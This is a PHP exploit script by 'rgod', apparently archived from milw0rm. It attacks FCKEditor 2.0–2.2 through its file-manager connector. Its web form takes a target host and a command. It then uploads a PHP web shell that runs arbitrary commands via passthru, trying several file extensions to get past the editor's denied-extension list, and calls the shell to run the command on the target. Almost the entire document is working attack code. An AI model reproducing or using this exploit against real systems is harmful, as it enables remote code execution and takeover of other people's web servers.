<?php
#  ---fckeditor_22_xpl.php                              15.38 04/12/2005       #
#                                                                              #
#                       FCKEditor 2.0 <= 2.2 shell upload                      #
#                              coded by rgod                                   #
#                     site: http://retrogod.altervista.org                     #
#                                                                              #
#  usage: launch from Apache, fill in requested fields, then go!               #
#                                                                              #
#  Sun-Tzu: "Security against defeat implies defensive tactics; ability to     #
#  defeat the enemy means taking the offensive"                                #

/* -> a short explaination: if a user cam call directly

      http://[target]/[path]/editor/filemanager/browser/default/connectors/php/connector.php

      he can upload malicious contempt on a target server, including arbitrary
      php code, and launch commands on it

      this works when php connector is enabled in config.php and when, ex.,
      in Apache httpd.conf "AddType application/x-httpd-php" directive we have
      an extension not specified in FCKEditor Config[DeniedExtensions][File]
      array.

      However, FCKeditor is integrated in a lot of applications, and if you
      succeed to upload the shell (see details in the output of this script)
      search for a local inclusion issue inside of them and include the uploaded
      file                                                                    */

error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout", 5);
ob_implicit_flush (1);

echo'<html><head><title> ******* FCKEditor 2.0 <= 2.2 shell upload**************
</title><meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<style type="text/css"> body {background-color:#111111;   SCROLLBAR-ARROW-COLOR:
#ffffff; SCROLLBAR-BASE-COLOR: black; CURSOR: crosshair; color:  #1CB081; }  img
{background-color:   #FFFFFF   !important}  input  {background-color:    #303030
!important} option {  background-color:   #303030   !important}         textarea
{background-color: #303030 !important} input {color: #1CB081 !important}  option
{color: #1CB081 !important} textarea {color: #1CB081 !important}        checkbox
{background-color: #303030 !important} select {font-weight: normal;       color:
#1CB081;  background-color:  #303030;}  body  {font-size:  8pt       !important;
background-color:   #111111;   body * {font-size: 8pt !important} h1 {font-size:
0.8em !important}   h2   {font-size:   0.8em    !important} h3 {font-size: 0.8em
!important} h4,h5,h6    {font-size: 0.8em !important}  h1 font {font-size: 0.8em
!important} 	h2 font {font-size: 0.8em !important}h3   font {font-size: 0.8em
!important} h4 font,h5 font,h6 font {font-size: 0.8em !important} * {font-style:
normal !important} *{text-decoration: none !important} a:link,a:active,a:visited
{ text-decoration: none ; color : #99aa33; } a:hover{text-decoration: underline;
color : #999933; } .Stile5 {font-family: Verdana, Arial, Helvetica,  sans-serif;
font-size: 10px; } .Stile6 {font-family: Verdana, Arial, Helvetica,  sans-serif;
font-weight:bold; font-style: italic;}--></style></head><body><p class="Stile6">
 ******* FCKEditor 2.0 <= 2.2 shell upload************** </p><p class="Stile6">a
script  by  rgod  at    <a href="http://retrogod.altervista.org"target="_blank">
http://retrogod.altervista.org</a> </p> <table  width="84%"><tr><td width="43%">
<form name="form1" method="post"   action="'.$_SERVER[PHP_SELF].'">    <p><input
type="text"  name="host"> <span class="Stile5">* target    (ex:www.sitename.com)
</span></p> <p><input type="text" name="path">  <span class="Stile5">* path (ex:
/FCKEditor/ or just / ) </span></p><p><input type="text" name="cmd">       <span
class="Stile5"> * specify a command</span></p><p><input type="text" name="port">
<span class="Stile5">specify  a  port other than  80 (default value)</span> </p>
<p><input   type="text" name="proxy"><span class="Stile5"> send  exploit through
an HTTP proxy (ip:port) </span>  </p>  <p>  <input   type="submit" name="Submit"
value="go!"></p></form></td></tr></table></body></html>';

function show($headeri)
{
  $ii=0;$ji=0;$ki=0;$ci=0;
  echo '<table border="0"><tr>';
  while ($ii <= strlen($headeri)-1){
    $dAtAi=dechex(ord($headeri[$ii]));
    if ($ji==16) {
      $ji=0;
      $ci++;
      echo "<td>&nbsp;&nbsp;</td>";
      for ($li=0; $li<=15; $li++) {
        echo "<td>".htmlentities($headeri[$li+$ki])."</td>";
		}
      $ki=$ki+16;
      echo "</tr><tr>";
    }
    if (strlen($dAtAi)==1) {
      echo "<td>0".htmlentities($dAtAi)."</td>";
    }
    else {
      echo "<td>".htmlentities($dAtAi)."</td> ";
    }
    $ii++;$ji++;
  }
  for ($li=1; $li<=(16 - (strlen($headeri) % 16)+1); $li++) {
    echo "<td>&nbsp&nbsp</td>";
  }
  for ($li=$ci*16; $li<=strlen($headeri); $li++) {
    echo "<td>".htmlentities($headeri[$li])."</td>";
  }
  echo "</tr></table>";
}

$pRoXy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';

function sendpacket() //2x speed
{
  global $pRoXy, $host, $port, $pAcKeT, $HtMl, $pRoXy_regex;
  $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
  if ($socket < 0) {
    echo "socket_create() failed: reason: " . socket_strerror($socket) . "<br>";
  }
  else {
    $c = preg_match($pRoXy_regex,$pRoXy);
    if (!$c) {echo 'Not a valid prozy...';
    die;
    }
  echo "OK.<br>";
  echo "Attempting to connect to ".$host." on port ".$port."...<br>";
  if ($pRoXy=='') {
    $result = socket_connect($socket, $host, $port);
  }
  else {
    $parts =explode(':',$pRoXy);
    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';
    $result = socket_connect($socket, $parts[0],$parts[1]);
  }
  if ($result < 0) {
    echo "socket_connect() failed.\r\nReason: (".$result.") " . socket_strerror($result) . "<br><br>";
  }
  else {
    echo "OK.<br><br>";
    $HtMl= '';
    socket_write($socket, $pAcKeT, strlen($pAcKeT));
    echo "Reading response:<br>";
    while ($out= socket_read($socket, 2048)) {$HtMl.=$out;}
    echo nl2br(htmlentities($HtMl));
    echo "Closing socket...";
    socket_close($socket);
  }
  }
}

function sendpacketii($pAcKeT)
{
  global $pRoXy, $host, $port, $HtMl, $pRoXy_regex;
  if ($pRoXy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.htmlentities($host); die;
    }
  }
  else {
	$c = preg_match($pRoXy_regex,$pRoXy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$pRoXy);
    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$pAcKeT);
  if ($pRoXy=='') {
    $HtMl='';
    while (!feof($ock)) {
      $HtMl.=fgets($ock);
    }
  }
  else {
    $HtMl='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$HtMl))) {
      $HtMl.=fread($ock,1);
    }
  }
  fclose($ock);
  echo nl2br(htmlentities($HtMl));
  }


function refresh()
{
  flush();
  ob_flush();
  usleep(100000);
}
function make_seed()
{
   list($usec, $sec) = explode(' ', microtime());
   return (float) $sec + ((float) $usec * 100000);
}

$host=$_POST[host];$port=$_POST[port];
$path=$_POST[path];$cmd=$_POST[cmd];
$pRoXy=$_POST[proxy];
echo "<span class=\"Stile5\">";

if (($host<>'') and ($path<>'') and ($cmd<>''))
{
  $port=intval(trim($port));
  if ($port=='') {$port=80;}
  if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
  if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
  $host=str_replace("\r","",$host);$host=str_replace("\n","",$host);
  $path=str_replace("\r","",$path);$path=str_replace("\n","",$path);

  //modify the shell as you want, this could be written in any language
  //if exploit succeeded we will see phpinfo() even, check for disable_functions
  //if passthru() disabled, try with system(), exec(), popen() or shell_exec()
  $SHELL ="<?php echo chr(72).\"i Master!\";ini_set(\"max_execution_time\",0);error_reporting(0);";
  $SHELL.="phpinfo();passthru(\$HTTP_GET_VARS[cmd]);?>";
  //we try to guess allowed extensions...
  // you should succeed with .php3 for 2.0fc
  //  "     "       "     "  .php  for 2.0rc1
  //  "     "       "     "  .php  for 2.0rc2
  //  "     "       "     "  .php3 for 2.0rc3
  //  "     "       "     "  .pwml for 2.1 (added some restrictions, but maybe
  //                                        this is executable on some machine)
  //  "     "       "     "  .pwml for 2.11
  //  "     "       "     "  .pwml for 2.2
  $extensions= array('.php', '.php3', '.php5', '.phtml','.pwml', '.php4', '.php2', '.inc');
  //add what you want
  //'FileUpload' for versions 2.11 - 2.1 - 2.0rc3 - 2.0rc2 - 2.0rc1 - 2.0fc
  //empty for 2.2
  $upload_command= array('FileUpload','');
  $path_to_shell="/UserFiles/File/"; //default one: if different, script will find it

  for ($x=0; $x<=count($extensions)-1; $x++)
  {
    for ($y=0; $y<=1; $y++)
    {
      # STEP 1 -> Upload the shell
      srand(make_seed());
      $anumber = rand(1,9999);
      $filename="suntzu".$anumber.$extensions[$x];
      $dAtA="-----------------------------7d529a1d23092a\r\n";
      $dAtA.="Content-Disposition: form-data; name=\"NewFile\"; filename=\"$filename\"\r\n";
      $dAtA.="Content-Type:\r\n\r\n";
      $dAtA.="$SHELL\r\n";
      $dAtA.="-----------------------------7d529a1d23092a--\r\n";
      $pAcKeT="POST ".$path."editor/filemanager/browser/default/connectors/php/";
      $pAcKeT.="connector.php?Command=".$upload_command[$y]."&Type=File&CurrentFolder= HTTP/1.1\r\n";
      $pAcKeT.="Content-Type: multipart/form-data; boundary=---------------------------7d529a1d23092a\r\n";
      $pAcKeT.="User-Agent: Sun-tzu giving you the pain\r\n";
      $pAcKeT.="Host: ".$host."\r\n";
      $pAcKeT.="Content-Length: ".strlen($dAtA)."\r\n";
      $pAcKeT.="Connection: Close\r\n\r\n";
      $pAcKeT.=$dAtA;
      show($pAcKeT);
      sendpacketii($pAcKeT);
      if (!eregi("200 OK",$HtMl)) {die("Cannot find connector.php...<br>");}
      if (eregi("This connector is disabled",$HtMl)) {echo "Exploit failed... -> php connector not enabled";die;}
      if (eregi("url=\"",$HtMl))
      {
        $temp=explode("url=\"",$HtMl);
        $temp2=explode("\"",$temp[1]);
        $path_to_shell=$temp2[0];
      }
      echo "<br>path where I search shell: ".htmlentities($path_to_shell)."<br>";
      # STEP 2 -> Launch commands...
      #by default a "UserFiles/File/" dir is generated inside site root when you upload
      #files, this dir is not protected by an .htaccess file or whatever
      $pAcKeT="GET ".$path_to_shell.$filename."?cmd=".urlencode($cmd)." HTTP/1.1\r\n";
      $pAcKeT.="User-Agent: GoogleBot/1.1\r\n";
      $pAcKeT.="Host: ".$host."\r\n";
      $pAcKeT.="Connection: Close\r\n\r\n";
      show($pAcKeT);
      sendpacketii($pAcKeT);
      if (eregi("200 OK",$HtMl)) {
                                 if (eregi("Hi Master!",$HtMl))
    			         {echo "Exploit succeeded...<br>";
				  echo "we have a shell in http://".$host.$path_to_shell.$filename."<br>";
				  echo "we should have phpinfo() here, see html...<br>";
			          die;}
                                  else {echo "Successfully uploades...<br>
			                      but is not an executable on target server...<br>";}
                               }
      refresh();
    }

  }
#if you are here...
echo "Exploit failed...";
}
else
{echo "Fill * required fields, optionally specify a proxy...";}
echo "</span>";
?>

# milw0rm.com [2006-02-09]
